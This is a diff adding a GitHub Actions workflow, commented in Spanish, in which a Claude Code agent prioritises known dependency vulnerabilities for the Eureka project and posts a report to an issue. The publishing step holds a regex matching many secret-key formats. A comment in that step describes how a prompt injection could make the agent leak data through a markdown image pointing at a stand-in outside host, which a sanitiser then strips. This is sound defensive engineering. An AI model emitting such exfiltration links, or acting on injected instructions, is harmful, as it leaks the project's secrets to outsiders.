@@ -1,0 +1,217 @@
+name: eureka-dependencias
+
+# Agente de propósito específico: las dependencias con vulnerabilidades
+# conocidas.
+#
+# Eureka depende de librerías que manejan claves, firmas y pagos (Openfort,
+# viem, tweetnacl, @noble/post-quantum, MercadoPago) y de OpenZeppelin en los
+# contratos. Ningún revisor las mira: los agentes de PR leen el diff, y una
+# vulnerabilidad nueva aparece en una librería que nadie tocó.
+#
+# `npm audit` solo tira una lista, y casi siempre larga. Lo que hace falta es
+# saber cuáles importan para Eureka: si el paquete llega a producción, si el
+# código usa la parte vulnerable, si el arreglo es un cambio mayor. Eso es lo
+# que hace el agente.
+#
+# Como Blockers, la detección es de un script determinista y el agente solo
+# prioriza lo que el script encontró. Mantiene un único issue vivo (etiqueta
+# `dependencias`): lo abre o actualiza cuando hay algo y lo cierra cuando una
+# corrida sale limpia.
+
+on:
+  schedule:
+    - cron: "0 12 * * 1" # 09:00 ART, los lunes
+  workflow_dispatch:
+
+concurrency:
+  group: eureka-dependencias
+  cancel-in-progress: false
+
+jobs:
+  revisar:
+    name: Eureka Dependencias
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    permissions:
+      contents: read
+      issues: write
+      id-token: write
+
+    steps:
+      # Los submódulos hacen falta para leer la versión de OpenZeppelin.
+      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6
+        with:
+          fetch-depth: 1
+          submodules: recursive
+          persist-credentials: false
+
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
+        with:
+          node-version-file: .nvmrc
+
+      - name: Juntar los hechos
+        id: hechos
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          bash .github/scripts/dependencias-facts.sh > facts.json
+          jq -c .resumen facts.json
+
+          # Sin nada que priorizar no vale la pena gastar una corrida del
+          # agente. Tampoco si no se pudo medir: el paso que publica lo dice.
+          hay=$(jq '.resumen | (.criticas + .altas + .moderadas + .bajas + .avisos_solidity) > 0' facts.json)
+          echo "hay_algo=$hay" >> "$GITHUB_OUTPUT"
+
+      - name: Priorizar con el agente
+        if: steps.hechos.outputs.hay_algo == 'true'
+        uses: anthropics/claude-code-action@1d6de8cb0c237e7c15e9e1bdf973826ebae490cc # v1
+        with:
+          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          prompt: |
+            Sos el revisor de dependencias de Eureka.
+
+            Leé `facts.json` en la raíz del workspace: las vulnerabilidades que
+            encontró `npm audit` (con `en_produccion` para saber si el paquete
+            llega a la app desplegada) y los avisos de GitHub para las versiones
+            de OpenZeppelin de los contratos. Para el contexto del producto,
+            `.github/copilot-instructions.md`.
+
+            **No inventes nada.** Solo podés hablar de vulnerabilidades que estén
+            en `facts.json`. No agregues CVEs, versiones ni arreglos que no
+            aparezcan ahí.
+
+            Para cada una, buscá en el código (`app/`, `lib/`, `visual_pages/`,
+            `contracts/src/`) si Eureka importa el paquete afectado y si usa la
+            parte vulnerable que describe el aviso. Si llega por otra
+            dependencia (`llega_por`), decí por cuál.
+
+            Escribí `dependencias-report.md` con esta forma:
+
+            1. Una línea de resumen: cuántas hay que atender ya y cuántas pueden
+               esperar.
+            2. **Atender ya**: las críticas o altas que llegan a producción o a
+               los contratos y cuyo código vulnerable Eureka usa. Para cada una:
+               el paquete, qué permite el ataque en términos de Eureka (con el
+               archivo donde se usa), el arreglo (versión, y si es un cambio
+               mayor que puede romper algo) y quién lo hace (el TL).
+            3. **Pueden esperar**: el resto, una línea cada una con el motivo
+               (solo desarrollo, Eureka no usa esa parte, severidad baja).
+            4. Si no podés saber si Eureka usa la parte vulnerable, ponela en
+               "Atender ya" y decí que es una sospecha.
+
+            Si la lista es larga, investigá primero las críticas y altas que
+            llegan a producción. Las que llegan por la misma dependencia
+            directa se arreglan juntas: agrupalas bajo esa dependencia en vez
+            de listarlas una por una.
+
+            En castellano, breve. Sin título ni fecha: el issue ya los tiene.
+          claude_args: >-
+            --max-turns 40
+            --allowedTools "Read,Write,Glob,Grep"
+
+      - name: Publicar
+        if: always()
+        uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7
+        with:
+          script: |
+            const fs = require('fs');
+            const etiqueta = 'dependencias';
+            const run = `${context.serverUrl}/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}`;
+            // Copia idéntica en eureka-costos, eureka-dependencias y
+            // eureka-incidentes. Además de los prefijos conocidos, las claves
+            // de Eureka que no tienen uno: el access token de MercadoPago, la
+            // service_role nueva de Supabase y la clave privada del signer
+            // (64 hex). Los 64 hex se tachan en vez de descartar el texto,
+            // porque un hash de transacción tiene la misma forma.
+            const CREDENCIAL = /(gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|sk-ant-[A-Za-z0-9_-]{10,}|sk_(live|test)_[A-Za-z0-9]{10,}|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|AKIA[0-9A-Z]{16}|-----BEGIN [A-Z ]*PRIVATE KEY-----|(APP_USR|TEST)-\d{6,}-[A-Za-z0-9-]{10,}|sb_secret_[A-Za-z0-9_-]{10,})/;
+            const HEX64 = /(?<![0-9a-fA-F])(0x)?[0-9a-fA-F]{64}(?![0-9a-fA-F])/g;
+
+            // Sanea lo que se publica, igual que eureka-dod: una instrucción
+            // inyectada en lo que lee el agente podría hacerle escribir
+            // ![](https://otro.host/?d=...), y GitHub baja la imagen sola al
+            // mostrar el texto. No queda nada que se cargue solo ni links fuera
+            // de github.com. Copia idéntica en eureka-resumen-pr, eureka-dod,
+            // eureka-post-deploy, eureka-blockers, eureka-progreso,
+            // eureka-costos, eureka-dependencias y eureka-incidentes: si cambiás
+            // una, cambiá todas.
+            const sanear = (texto) => String(texto)
+              .replace(/</g, '&lt;')
+              .replace(/!\[([^\]]*)\]\([^)]*\)/g, '$1')
+              .replace(/!\[/g, '!\\[')
+              .replace(/(`{3,}|~{3,})[ \t]*(mermaid|geojson|topojson|stl)\b/gi, '$1text')
+              .replace(/\]\((?!\s*https:\/\/github\.com\/)/gi, ']\\(')
+              .replace(/\]:/g, ']\\:')
+              .replace(/(https?|ftp):\/\/(?!github\.com\/)/gi, (_, esquema) => `${esquema.replace(/t/gi, 'x')}://`)
+              .replace(/www\./gi, 'www\\.');
+
+            const { data: abiertos } = await github.rest.issues.listForRepo({
+              owner: context.repo.owner, repo: context.repo.repo,
+              state: 'open', labels: etiqueta,
+            });
+            const issue = abiertos[0];
+            const publicar = async (body) => {
+              if (issue) {
+                await github.rest.issues.update({
+                  owner: context.repo.owner, repo: context.repo.repo,
+                  issue_number: issue.number, body,
+                });
+              } else {
+                await github.rest.issues.create({
+                  owner: context.repo.owner, repo: context.repo.repo,
+                  title: 'Dependencias con vulnerabilidades conocidas',
+                  labels: [etiqueta], body,
+                });
+              }
+            };
+
+            // Como en post-deploy: no poder medir tiene que verse como una
+            // falla, no como una semana limpia.
+            if (!fs.existsSync('facts.json')) {
+              await publicar(`> **No se pudieron revisar las dependencias.** El script no dejó resultado. Revisá el log: ${run}`);
+              return;
+            }
+            const facts = JSON.parse(fs.readFileSync('facts.json', 'utf8'));
+            const r = facts.resumen;
+            const total = r.criticas + r.altas + r.moderadas + r.bajas + r.avisos_solidity;
+            const faltas = [];
+            if (!r.npm_ok) faltas.push('`npm audit` no devolvió resultado');
+            if (!r.solidity_ok) faltas.push('no se pudo leer o consultar alguna librería de `contracts/lib`');
+
+            const tabla = [
+              '| | |', '|---|---|',
+              `| Críticas | ${r.criticas} |`,
+              `| Altas | ${r.altas} |`,
+              `| Moderadas | ${r.moderadas} |`,
+              `| Bajas | ${r.bajas} |`,
+              `| …que llegan a producción | ${r.en_produccion} |`,
+              `| Avisos de OpenZeppelin | ${r.avisos_solidity} |`,
+            ].join('\n');
+            const pie = `<sub>Revisado ${facts.generado} · [corrida](${run})</sub>`;
+            const aviso = faltas.length ? `> **Revisión incompleta:** ${faltas.join('; ')}.\n\n` : '';
+
+            if (total === 0) {
+              if (faltas.length) {
+                await publicar(`${aviso}${tabla}\n\n${pie}`);
+              } else if (issue) {
+                await github.rest.issues.createComment({
+                  owner: context.repo.owner, repo: context.repo.repo,
+                  issue_number: issue.number,
+                  body: `Resuelto: la revisión de hoy no encontró vulnerabilidades conocidas.\n\n${pie}`,
+                });
+                await github.rest.issues.update({
+                  owner: context.repo.owner, repo: context.repo.repo,
+                  issue_number: issue.number, state: 'closed',
+                });
+              }
+              return;
+            }
+
+            let cuerpo = fs.existsSync('dependencias-report.md')
+              ? fs.readFileSync('dependencias-report.md', 'utf8').replace(HEX64, '[tachado]')
+              : '> **El agente no dejó reporte.** La tabla de abajo sale del script y es correcta.';
+            if (CREDENCIAL.test(cuerpo)) {
+              core.warning('El reporte parecía contener una credencial: no se publica');
+              cuerpo = '> **Se descartó el reporte del agente** porque parecía contener una credencial. '
+                + `La tabla de abajo sale del script y es correcta. Revisá la corrida: ${run}`;
+            }
+            await publicar(`${aviso}${sanear(cuerpo)}\n\n---\n\n${tabla}\n\n${pie}`);
